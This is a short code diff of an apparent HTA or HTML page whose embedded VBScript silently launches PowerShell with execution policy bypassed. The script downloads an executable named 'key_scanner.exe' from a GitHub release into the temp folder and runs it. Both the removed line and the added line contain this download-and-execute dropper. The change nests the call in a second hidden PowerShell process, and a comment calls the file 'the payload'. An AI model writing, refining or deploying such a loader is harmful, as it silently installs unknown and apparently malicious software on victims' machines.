@@ -9,8 +9,8 @@
 
 <script language="VBScript">
 Set objShell = CreateObject("Wscript.Shell")
-' Run PowerShell silently and hidden
-objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out""", 0, False
+' Run PowerShell silently and download and execute the payload
+objShell.Run "powershell -ExecutionPolicy Bypass -Command ""Start-Process 'powershell' -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out""'""", 0, False
 Self.Close
 </script>
 
